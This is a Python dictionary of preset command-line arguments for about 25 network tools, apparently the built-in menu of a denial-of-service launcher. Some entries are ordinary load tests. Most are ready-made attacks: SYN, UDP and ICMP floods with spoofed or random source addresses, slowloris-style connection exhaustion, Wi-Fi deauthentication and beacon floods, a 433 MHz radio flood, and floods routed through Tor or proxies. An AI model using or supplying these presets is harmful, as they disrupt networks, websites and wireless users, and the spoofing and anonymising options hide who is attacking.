BUILTIN_ARGS = {
    "hping3": [
        ("-S target.com -p 80 --flood", "SYN flood"),
        ("-S target.com -p 443 --flood", "HTTPS SYN flood"),
        ("--udp target.com -p 53 --flood", "UDP flood DNS"),
        ("-1 target.com --flood", "ICMP flood"),
        ("-S target.com -p 80 --rand-source", "SYN random source"),
        ("-S target.com -p 80 -a SPOOFED_IP", "SYN spoofed"),
        ("-2 target.com -p 443 --flood", "UDP flood"),
        ("--flood --rand-source target.com", "Random flood"),
    ],
    "slowloris": [
        ("-p 80 target.com", "HTTP slow"),
        ("-p 443 --https target.com", "HTTPS slow"),
        ("-s 500 target.com", "500 sockets"),
        ("-s 1000 --sleeptime 5 target.com", "1000 sockets slow"),
        ("-p 80 --proxy http://proxy:8080 target.com", "Via proxy"),
    ],
    "slowhttptest": [
        ("-c 1000 -H -g -o slow.log -i 10 -r 200 -t GET -u http://target.com", "Slow headers"),
        ("-c 1000 -B -g -o slow.log -i 10 -r 200 -t POST -u http://target.com", "Slow body"),
        ("-c 1000 -X -g -o slow.log -i 10 -r 200 -t GET -u http://target.com", "Slow read"),
    ],
    "goldeneye": [
        ("target.com -w 100 -s 200", "100 workers"),
        ("target.com -w 500 -s 200", "500 workers"),
        ("target.com -w 1000 -s 500", "1000 workers"),
        ("target.com -m random -w 500", "Random method"),
    ],
    "ab": [
        ("-n 1000 -c 10 http://target.com/", "1000 requests 10 concurrent"),
        ("-n 10000 -c 100 http://target.com/", "10K requests 100 concurrent"),
        ("-n 100000 -c 200 http://target.com/", "100K requests 200 concurrent"),
        ("-t 30 -c 50 http://target.com/", "30 second test"),
        ("-n 5000 -c 50 -H 'Accept-Encoding: gzip' http://target.com/", "With headers"),
        ("-n 1000 -c 10 -p 5 http://target.com/", "5 second delay"),
    ],
    "siege": [
        ("-c 100 -t 30s http://target.com", "100 users 30s"),
        ("-c 200 -r 50 http://target.com", "200 users 50 reps"),
        ("-c 500 -t 1M http://target.com", "500 users 1 minute"),
        ("-f urls.txt -c 100 -t 30s", "URL list file"),
        ("-c 50 -d 10 -t 30s http://target.com", "10 second delay"),
    ],
    "wrk": [
        ("-t 10 -c 100 -d 30s http://target.com", "10 threads 100 conns 30s"),
        ("-t 20 -c 500 -d 60s http://target.com", "20 threads 500 conns 60s"),
        ("-t 10 -c 100 -d 30s -s script.lua http://target.com", "With Lua script"),
    ],
    "hey": [
        ("-n 10000 -c 100 http://target.com", "10K requests 100 concurrent"),
        ("-n 100000 -c 500 http://target.com", "100K requests 500 concurrent"),
        ("-z 30s -c 100 http://target.com", "30 second duration"),
    ],
    "vegeta": [
        ("attack -duration=30s -rate=100 -targets=targets.txt", "100/sec for 30s"),
        ("attack -duration=60s -rate=500 -targets=targets.txt", "500/sec for 60s"),
        ("attack -duration=30s -rate=1000 -targets=targets.txt | vegeta report", "1K/sec with report"),
    ],
    "bombardier": [
        ("-c 100 -n 10000 http://target.com", "100 conns 10K requests"),
        ("-c 500 -d 30s http://target.com", "500 conns 30 seconds"),
    ],
    "gobench": [
        ("-u http://target.com -c 100 -t 30", "100 conns 30s"),
    ],
    "tcpreplay": [
        ("--intf1=eth0 --loop=0 --mbps=100 capture.pcap", "Replay at 100Mbps"),
        ("--intf1=eth0 --loop=10 capture.pcap", "Loop 10 times"),
    ],
    "nping": [
        ("--tcp-connect -p 80 --rate=100 target.com", "TCP rate test"),
        ("--udp -p 53 --rate=100 target.com", "UDP rate test"),
        ("--icmp --rate=100 target.com", "ICMP rate test"),
        ("--tcp-connect -p 80 --flags syn,ack --rate=200 target.com", "SYN+ACK flood"),
    ],
    "mdk3": [
        ("wlan0mon b -c 6 -s 1000", "Beacon flood"),
        ("wlan0mon a -a MAC", "Auth DoS"),
        ("wlan0mon d -w blacklist.txt", "Deauth flood"),
        ("wlan0mon m -t MAC", "Michael shutdown"),
    ],
    "mdk4": [
        ("wlan0mon b -c 6 -s 2000", "Beacon flood v2"),
        ("wlan0mon d -c 6", "Deauth flood v2"),
        ("wlan0mon e -t MAC -s 1000", "EAPOL flood"),
    ],
    "aireplay-ng": [
        ("-0 10 -a BSSID wlan0mon", "Deauth 10 packets"),
        ("-0 0 -a BSSID wlan0mon", "Deauth continuous"),
        ("-1 0 -e 'WiFi' -a BSSID wlan0mon", "Fake auth"),
        ("-3 -b BSSID wlan0mon", "ARP replay"),
    ],
    "pilight": [
        ("-p raw -f 433920000 -F 1000", "433MHz flood"),
    ],
    "rpitx": [
        ("-m AM -f 100000000", "AM transmission"),
        ("-m FM -f 100000000", "FM transmission"),
    ],
    "wificurse": [
        ("wlan0mon", "WiFi DoS"),
    ],
    "flooder": [
        ("-t target.com -p 80 -c 1000", "TCP flood"),
        ("-t target.com -p 80 -c 1000 --udp", "UDP flood"),
    ],
    "saphyra": [
        ("-t target.com -p 80 -c 100", "HTTP flood"),
    ],
    "hammer": [
        ("-s target.com -p 80 -t 10", "10 threads"),
    ],
    "t50": [
        ("--flood --protocol tcp --port 80 target.com", "TCP flood"),
        ("--flood --protocol udp --port 53 target.com", "UDP flood"),
        ("--flood --protocol icmp target.com", "ICMP flood"),
    ],
    "pyloris": [
        ("-p 80 target.com", "Slowloris Python"),
    ],
    "tor-hammer": [
        ("-t target.com -p 80 -r 100", "Via Tor 100 threads"),
    ],
    "ufonet": [
        ("-a target.com", "Single target"),
        ("-f targets.txt", "Multiple targets"),
        ("-a target.com --proxy=100", "100 proxies"),
    ],
}
